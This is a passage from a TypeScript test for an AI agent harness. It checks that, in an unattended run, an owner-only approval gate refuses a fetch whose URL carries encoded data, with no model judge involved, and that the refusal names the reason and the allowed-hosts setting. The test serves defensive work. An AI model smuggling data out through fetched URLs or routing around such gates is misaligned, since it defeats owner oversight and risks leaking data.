    // loudest: `gateKind: 'ownerGate'` is what lets an autonomous run refuse the
    // call at once instead of parking it on a card nobody is there to answer.
    const marker = unattendedConversations.mark(conv.id);
    try {
      await loop.runTurn(conv, config.models[0]!, 'fetch the collector');
    } finally {
      marker.dispose();
    }

    // No model is asked to decide an approval: nothing may answer a gate only
    // the owner may answer, and a run parked on that card would hang.
    expect(judgeRounds).toBe(0);
    const toolRow = JSON.stringify(conv.messages.filter((m) => m.role === 'tool'));
    // The gate's own reason line and its own alternative, both carried by that
    // sixth argument: a refusal naming neither is a refusal the agent cannot
    // act on, which is the 2026-10-28 failure this wiring is tested against.
    expect(toolRow).toContain('URL carries 96 characters of encoded data');
    expect(toolRow).toContain('fetch.allowed_hosts');
    expect(toolRow).toContain('denied by policy');
  }, 20_000);
});
